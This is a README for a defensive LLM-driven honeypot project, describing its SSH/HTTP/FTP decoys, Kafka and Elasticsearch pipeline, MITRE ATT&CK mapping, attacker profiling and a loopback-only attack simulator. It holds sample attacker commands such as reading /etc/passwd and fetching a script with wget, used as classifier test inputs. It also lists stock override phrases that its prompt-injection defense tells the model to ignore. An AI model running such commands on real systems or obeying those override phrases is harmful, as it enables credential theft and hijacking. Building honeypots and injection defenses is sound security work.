# LLM-Based Adaptive Honeypot Mesh

A multi-protocol honeypot (SSH, HTTP, FTP) in Node.js. An LLM generates
realistic fake responses to attacker input. Every interaction becomes an
event that flows through Kafka to a processor (geoip, MITRE ATT&CK
mapping, profiling), then to Elasticsearch for a dashboard, Grafana and
STIX export.

Day 1 is the foundation only: monorepo, config, logger, unified event
schema, a docker-compose skeleton and a Gemini model-check script. No
honeypot servers, no Kafka/Elasticsearch client code yet.

## Setup

Copy the example environment file and fill it in. Never commit a real
`.env` file, and never put a real API key anywhere except `.env`.

```sh
cp .env.example .env
npm install
```

## Tests

```sh
npm test
```

Note: every new test file must be added to the test script or it will silently not run.

## Check available Gemini models

This only lists models that support `generateContent`. It never prints
the API key. It needs `GEMINI_API_KEY` set in `.env` (or in the
environment); without a key it exits with code 1.

```sh
npm run check:gemini
```

## Docker Compose skeleton

`docker-compose.yml` defines Kafka (KRaft, single node), Elasticsearch
(single node) and Grafana for development only. Day 1 does not start it;
this only validates the file:

```sh
npm run lint:compose
```

## Running

Start a single service, or all three together in one process:

```sh
npm run start:ssh
npm run start:http
npm run start:ftp
npm run start:all
```

Ports (defaults, configurable via .env): SSH 2222, HTTP 8080, FTP 2121.
Events are written to the EVENT_DIR directory as ssh.jsonl, http.jsonl
and ftp.jsonl. Everything binds to loopback only (127.0.0.1 by default).

## Kafka

Stream every honeypot event to Kafka without slowing down the honeypots.
The local JSONL files stay the durable record.

```sh
docker compose up -d kafka
npm run kafka:setup
KAFKA_ENABLED=true npm run start:all
npm run kafka:tail -- 20
```

When Kafka is down: honeypots keep running, files keep being written,
and the Kafka queue retries with backoff until the broker comes back.
Set KAFKA_ENABLED=true in .env to enable streaming; by default it is off.

## Processor and Elasticsearch

The processor consumes honeypot events from Kafka, enriches them
(geoip + IP classification), aggregates per-session summaries and
indexes everything into Elasticsearch.

```sh
docker compose up -d kafka elasticsearch
npm run kafka:setup
npm run es:setup
KAFKA_ENABLED=true npm run start:all
npm run start:processor
npm run es:summary
```

Curl examples (loopback only):

```sh
curl http://localhost:9200/honeypot-events-*/_search?pretty -H 'Content-Type: application/json' -d '{"query":{"match_all":{}}}'
curl http://localhost:9200/honeypot-sessions/_search?pretty -H 'Content-Type: application/json' -d '{"query":{"match_all":{}}}'
```

Invalid messages and permanently rejected documents go to the dead
letter file at data/dead-letter.jsonl (PROCESSOR_DEAD_LETTER_FILE),
which stops growing at PROCESSOR_DEAD_LETTER_MAX_BYTES.

Known limitation: a crash between the Elasticsearch write and the
offset commit can re-deliver messages; events stay exact (same _id),
session counters are protected by the last-200 id window only.

## SSH honeypot core (Day 2)
SSH honeypot core with ssh2, a file event sink, and an allowlist of credential pairs, with tests 41.

## Virtual filesystem and command engine (Day 3)
Per-session virtual filesystem with root clamping, a parser with quote and chaining support, and core commands with a command-not-found fallback, with tests 74.

## Gemini service (Day 4)
Gemini service, not wired into SSH, with persona, prompt, output, cache, and limiter, with tests 119 after fix.

## LLM wired into SSH (Day 5)
LLM wired into SSH, static-first, with a deadline race and per-session filesystem for mutating commands, with tests 170.

## HTTP honeypot (Day 6)
HTTP honeypot with fake apps and an nginx persona, with tests 215.

## FTP honeypot and launcher (Day 7)
Shared virtual filesystem package, FTP honeypot on raw node net with a vsftpd persona, and a one-process launcher, with tests 265 after fix.

## Persona and honeytokens (Day 8)
Per-node persona derived from a seed, and honeytokens planted across services, with tests 310 after fix.

## Kafka streaming (Day 9)
Kafka streaming with a synchronous sink that never throws into the honeypots, with tests 343.

## Processor (Day 10)
Processor with Elasticsearch indexing, enrichment, session aggregation, and dead-letter handling, with tests 395 after fix.

## MITRE ATT&CK (Day 11, rules only)

A deterministic, local, rules-only classifier maps an attacker command,
HTTP request, FTP command, or auth event to MITRE ATT&CK technique IDs
in the processor, after Kafka and before Elasticsearch. It uses only
the local rules file (packages/mitre/src/rules.json): no LLM, no
profiling, no brute-force verdict, no session aggregation.

Mapped techniques include Discovery (T1033, T1082, T1083, T1087, T1057,
T1016, T1046), Credential Access (T1003, T1552.001, T1110.001 at 0.4),
Initial Access (T1190, T1078 at 0.4), Command and Control (T1105),
Defense Evasion (T1027), and Persistence (T1547). A single
auth_attempt is only a 0.4 hint, never a brute-force verdict; a
honeytoken viewed event is not mapped, only used is (T1552.001 at 0.9).

Run it manually: `npm run mitre:check -- "cat /etc/passwd"` or
`node tools/mitre-check.js "wget http://example.com/x.sh"`.

HTTP events now also carry payload.rawTarget: the original request.url
before URL normalization, capped at 2048 chars, so the classifier can
see ../ and percent-encoded SQLi that normalization and encoding would
otherwise hide. payload.path stays normalized, exactly as before.

## Behavior Profiling (Day 12, observation only)

For each session, when it closes or is evicted from memory, the
processor writes one behavior profile to honeypot-profiles with
_id = sessionId: actor type (bot, human, unknown), skill level,
intent, tools, and confidence, from rules first. Profiling never
changes any honeypot response and never joins sessions by IP.

The LLM is used only for ambiguous sessions (actor, skill, or intent
unknown, or confidence at most 0.5), never per event, never for a
session already classified at confidence 0.7 or above. In mock mode
no network call happens and the rules profile is returned. In real
mode the existing packages/llm cache and limiter are used, with a
sha256 cache key over the feature summary only. On invalid LLM
output or any LLM failure, the rules profile is returned with
llm.fallback=true. Never sent to the LLM: source IP, passwords,
token values, credentials, raw commands with arguments, raw query,
raw body, or rawTarget. Only the feature summary is sent.

Run it manually: `node tools/profile-check.js sample-session-summary.json`

Angle brackets in earlier guides meant placeholder only, never type them literally: `node tools/profile-check.js <sample-session-summary.json>` fails in PowerShell because < is redirection. Use a real file path with no < > characters.

Intent and skill are post-auth only (Day 12 FIX-2): auth techniques T1110.001 and T1078 are login, not intent, so they are excluded from intent and skill. A basic whoami/ls/pwd session is intent recon, skill beginner. An advanced wget session is intent exploitation, not credential_access, and never exfiltration unless a sensitive FTP RETR file left the honeypot. A session that only logged in and listed files is intent unknown.

In real mode the processor now wires the LLM enhancer by default (Day 12 FIX): ambiguous closed/evicted sessions are enhanced with the existing packages/llm cache, limiter, and Gemini client, using config GEMINI_MODEL exactly and a classification schema, so the model returns the classification fields instead of the shell output/exitCode fields.


Model fallback and skill exit (Day 12 FIX-3): on MODEL_NOT_FOUND (404) for the primary model, the profiler tries GEMINI_FALLBACK_MODEL exactly once in the same attempt, with one limiter acquire for the whole attempt. A fallback-model success is stored with llm.used=true, llm.fallback=false, llm.model=fallback model name, and a non-null latencyMs, because profile llm.fallback means rules fallback only, not model fallback. If both models return 404, the code LLM_MODEL_NOT_FOUND is logged, rules fallback is stored, and the model-unavailable state is cached for 60 seconds (MODEL_UNAVAILABLE_COOLDOWN_MS in llm-classify.js, testable with an injected clock), so later profiles in the same minute get the true code without wasting limiter quota and without being misreported as LLM_LIMITER. Both-404 attempts are refunded from the limiter (limiter.release), so a 404 does not count toward RPM=8; successful attempts still count, and RPM still denies after 8 successes. Session-close command "exit" is filtered from skill determination input only; commandNames stored in the profile still include exit for audit. A basic whoami/ls/pwd/exit session is therefore skill beginner, intent recon.


Adaptive mesh controller (Day 13, decision only): for each source IP, closed-session profiles are merged into one correlated attacker profile in honeypot-attackers, keyed by attackerId = sourceIp (the attacking client address, needed for lookup, not user PII). Correlation is rules-only, no LLM: skill is highest, actor is majority (tie unknown), intent is highest-priority RULES intent (unknown < recon < credential_access < exploitation < exfiltration < persistence), confidence is maximum, and llmIntentMismatch is true when a stored profile intent differs from its rulesIntent. Strategy is exactly one of engage, deceive, contain, observe, with one-step cross-service escalation capped at contain. The strategy is stored and logged only; it never changes a live honeypot response, never blocks, bans, or firewalls any real IP in Day 13. Run it manually: `node tools/adaptive-check.js 127.0.0.1` (reads the stored attacker document from Elasticsearch) or `node tools/adaptive-check.js profiles.json` (builds from a JSON array of profiles). Files containing a password, token, or credential field are refused without printing their contents.


## API (Day 14, read-only)
Start the API with `npm run start:api` (listens on 127.0.0.1:3001 in dev, config API_HOST, API_PORT, API_POLL_MS). It serves events, sessions, profiles, attackers, and stats from Elasticsearch, and streams new documents over Socket.IO. Check it with `node tools/api-check.js` or `node tools/api-check.js http://127.0.0.1:3001`. Authentication is Day 18 hardening work; loopback-only binding in dev is the Day 14 control. Week 2 review: docs/week2-review.md.


## Dashboard (Day 15)
Open http://127.0.0.1:3001/dashboard, served same-origin from the existing API service, no separate port, no external map, tile server, CDN, font, or chart library. Sections: Live feed, Stats, Timeline, Top commands, ATT&CK heatmap, Sources. Live feed comes from Socket.IO event, profile, and attacker messages, deduplicated by id and capped at 100 rows; if the socket is offline for more than 10 seconds, the dashboard shows "Live feed offline, polling" and polls /api/events?limit=20 every 5 seconds with the same dedup until the socket reconnects. Stats refresh every 30 seconds from /api/stats. Top commands are aggregated from profiles only, never from sessions as well, so commands are not double counted. The heatmap counts only Day 11 allowed technique IDs with tactics from the mitre rules, and drops any other ID. The Sources panel is a list from /api/stats topSourceIps, not a geographic map: geo is null for loopback traffic, so 127.0.0.1 is never placed on a map and no country, city, or coordinate is invented for it. Check it with `node tools/dashboard-check.js` or `node tools/dashboard-check.js http://127.0.0.1:3001`.


## Dashboard fix (Day 15 FIX)
Initial load is newest-first from /api/events?limit=200 sorted client-side, never the oldest 20. Live documents prepend to the feed and update the timeline and the top-bar last event. Stats refresh updates stats cards and footer totals only and never resets the feed. The API was not changed to fix this; sorting happens in the dashboard.


## Attacker page, STIX, Grafana (Day 16)
Attacker page: http://127.0.0.1:3001/dashboard/attacker?ip=127.0.0.1 — the ip query is required, missing or invalid ip shows a plain error. Data comes from /api/attackers/:ip, /api/sessions?sourceIp=:ip, and /api/profiles?limit=200 filtered client-side by sourceIp, because the profiles route has no sourceIp filter and Day 16 does not change it. STIX export: GET /api/attackers/:ip/stix returns a STIX 2.1 bundle with one identity for the ip, one attack-pattern per unique allowed technique with a mitre-attack external_id, and one observed-data object per session up to 20 sessions. The bundle deliberately contains no raw event observables: object_refs is empty, because raw events are not exported on Day 16. Grafana: http://127.0.0.1:3000, loopback only, provisioned from provisioning/grafana with an Elasticsearch datasource and a MESH OVERVIEW dashboard. Admin user and password are not set by the agent and are not in any repo file: set GF_ADMIN_USER and GF_ADMIN_PASSWORD yourself in the environment before starting Grafana with docker compose, and never commit them.


## Attack simulator and integration tests (Day 17)
Attack simulator: `node tools/attack-simulator.js --scenario basic-ssh --count 1 --delay 1000`, `node tools/attack-simulator.js --list`, and `node tools/attack-simulator.js --dry-run --scenario advanced-ssh`. Scenarios, exactly: basic-ssh, advanced-ssh, ftp-list, http-login, http-traversal, mixed. The mixed scenario runs basic-ssh, then ftp-list, then http-login, in that order, every time. Every scenario is deterministic: same scenario, same count, same delay, same order of requests, same output summary format, never random order, commands, or delays. Safety allowlist, enforced before any connection: the simulator only connects to 127.0.0.1, and only to ports 2222 for SSH, 8080 for HTTP, and 2121 for FTP. Any other host, IP, port, or hostname is rejected with a plain error and exit 1 before any connection attempt. Live simulator traffic only targets loopback honeypots; it never targets any other host or any real system, and it never runs attacker input on the local machine. SSH simulation uses the ssh2 client already present in the repo (no new dependency); if that client is unavailable, SSH scenarios fail with a plain error stating that live SSH simulation needs the system ssh client. FTP listing uses anonymous login and LIST only, never RETR or any download. The output summary is plain text with scenario, count, host, ports, requests sent, requests failed, and request types only, never passwords, token values, file contents, or full command arguments beyond the first token and the fixed wget test URL. Integration tests (services/processor/test/integration.test.js) use injected fakes only: a simulator-shaped event goes through a fake Kafka sink, then the real processor with a fake Elasticsearch client, then MITRE classification, profiling, attacker correlation, the API read helpers, and the STIX route, with assertions at each stage. They do not prove real Docker, Kafka, or Elasticsearch behaviour. Live simulator verification is Ujjwal's job.

## Hardening: isolation, prompt-injection defense, rate limits, fingerprint resistance (Day 18)
Isolation guarantee: honeypot code never executes attacker input. SSH, HTTP, and FTP commands only generate text through the internal command engine and virtual filesystem; no child_process, exec, spawn, eval, or new Function call exists in attacker input handling, and virtual filesystem traversal is normalized and clamped at the virtual root, never mapped to a real filesystem path. The only "exec" in the SSH code is the ssh2 protocol channel name for an incoming exec request, which is handled by the internal engine, not by running a system command. No Docker, root, or new dependency isolation was added: the honeypots run as a non-admin user and the agent cannot test Docker live, so isolation stays code-level and in-memory. Prompt-injection defense: attacker input is always wrapped as untrusted data, never as instructions. The SSH user message is wrapped between BEGIN UNTRUSTED INPUT and END UNTRUSTED INPUT markers, and the HTTP request is sent as a single JSON-encoded object, never as free text and never as a system instruction. Both system prompts state the internal honeypot-persona role, forbid revealing the system prompt, model name, API key, internal paths, or real system information, and forbid following instructions from attacker input even when it says ignore previous instructions, you are now something else, or system override. LLM output is validated before use: maximum length, no system prompt echo, no API key pattern, no real file path, and no instruction to run a command on a real system; invalid output falls back to the existing static fallback, never to raw LLM output. Passwords, token values, credentials, raw query values with secrets, raw body secrets, and rawTarget are never sent to the LLM; credential-bearing query, body, and cookie values are redacted before the HTTP prompt is built. Rate limits, in-memory only, reset on restart, never stored in Elasticsearch, never a real IP block: per source IP per service, maximum 60 connections or requests per minute for SSH, HTTP, and FTP each; per source IP global across services, maximum 120 per minute; API read routes, maximum 120 requests per minute per IP, with excess returning 429 with code RATE_LIMITED only. Excess honeypot connections are rejected with the normal honeypot response (SSH connection closed, FTP 421, HTTP socket closed), never a crash or hang. LLM limits are unchanged: RPM 8, daily 400, session 40. Fingerprint resistance: SSH banner, HTTP Server header, and FTP banner all carry the same persona versions (OpenSSH_8.9p1 Ubuntu-3ubuntu0.6, nginx/1.18.0 (Ubuntu), vsFTPd 3.0.5), with no Node, Express, or real software version leaking in any banner or header, and HTTP 404 routes use the same persona headers as normal routes. Persona boot time is no longer a fixed 2024 date: for a given seed and date it is derived deterministically as the current date minus 40 to 90 days (seed stream "seed:boot-time"), so reported uptime is always plausible and never about two years. Hardening is in-memory and persona-level only, not a real firewall, sandbox, or root isolation, and it does not make the honeypot undetectable. Live Docker, Elasticsearch, API, Grafana, simulator, and browser verification is Ujjwal's job.

## Simulator FIX: FTP and mixed summaries, SSH login, exit codes
Simulator FIX: the FTP summary is now always printed, on success, connection failure, login failure, passive failure, and LIST failure, never a silent exit, because the FTP data connection is now consumed and guarded by a 5 second timeout instead of waiting forever on a data socket that never closes. The mixed scenario now always prints one summary at the end even when FTP fails: FTP failure counts as failed requests in the mixed summary, it never stops the HTTP step, and it never exits the process before the summary. SSH login is unchanged in method and pair, password login with the honeypot's own fake test pair, which manual login already proved: the live basic-ssh failure was not a wrong pair, it was the SSH stream close event never firing because the client never consumed the stream output, so the session hit the 15 second timer and counted as failed; the stream is now consumed and the connection close also ends the session, so basic-ssh completes. The HTTP step now sends every request in the batch, so http-login really sends both the GET and the POST instead of counting both while sending only the first. A live run now exits with code 1 when any request failed and code 0 when none failed; dry-run and list still exit 0, allowlist rejection still exit 1. Exact usage, dry-run mixed: node tools/attack-simulator.js --dry-run --scenario mixed. Exact usage, live mixed: node tools/attack-simulator.js --scenario mixed --count 1 --delay 1000. No new scenario, no new request type, no new dependency, no honeypot code change, no Grafana change. Live simulator verification is Ujjwal's job.

## Evaluation: dwell time, latency, and ATT&CK coverage (Day 19)
Evaluation tools, plain Node, no new dependency. Dwell: node tools/eval-dwell.js --api-base http://127.0.0.1:3001. Latency: node tools/eval-latency.js --api-base http://127.0.0.1:3001. ATT&CK: node tools/eval-attack.js --api-base http://127.0.0.1:3001. Dwell time uses firstSeen and lastSeen only: duration seconds equals lastSeen minus firstSeen divided by 1000, sessions without a usable lastSeen are incomplete and excluded from median and mean, LLM sessions are complete sessions with an llm_response count greater than 0, static sessions are the rest, and the reported difference is LLM median minus static median. Latency uses Date.now only, 20 sequential samples per target, median, mean, min, and max over successful samples, for API /api/health, honeypot HTTP GET /wp-login.php, and honeypot SSH banner time to first banner line only, never a full login, connecting only to 127.0.0.1 and only to ports 2222, 8080, 2121, and 3001. ATT&CK coverage uses the Day 11 allowed list of 15 techniques only: observed allowed techniques divided by 15, with allowed techniques never observed listed separately and unknown techniques counted separately, never mapped to an allowed technique. All results are TBD until live measurement, full formulas and the results table are in docs/evaluation.md, and no claim is made that LLM beats static. No Grafana panel or datasource change is included, Grafana panels showing data is not claimed, Day 20 is still pending, and the project is not complete. Live measurement is Ujjwal’s job.

## Spawn-free two-step demo and code freeze (Day 20)
Spawn-free demo usage, two steps, no angle brackets. Step 1: set GF_ADMIN_USER and GF_ADMIN_PASSWORD on the host, then docker compose up -d kafka elasticsearch grafana, wait 60 to 90 seconds, check docker compose ps and ES on 127.0.0.1:9200. Step 2: npm run demo, which starts processor, honeypots, and API in-process, runs simulator basic and mixed, and prints URLs. One-command demo was changed by user decision on 2026-10-29 to a spawn-free two-step demo, because guard.js bans child processes and no guard exception was given, compose is run manually by the user, demo services are in-process only. Guard is preserved with no exception. Code freeze checklist: node tools/freeze-check.js, which checks the test list, the README day paragraphs, the final report sections, task markers, and hardcoded secrets, and exits with code 1 if any check fails. Final report location: docs/final-report.md. Code freeze is not deployment. Grafana panels No data remains a separate issue.
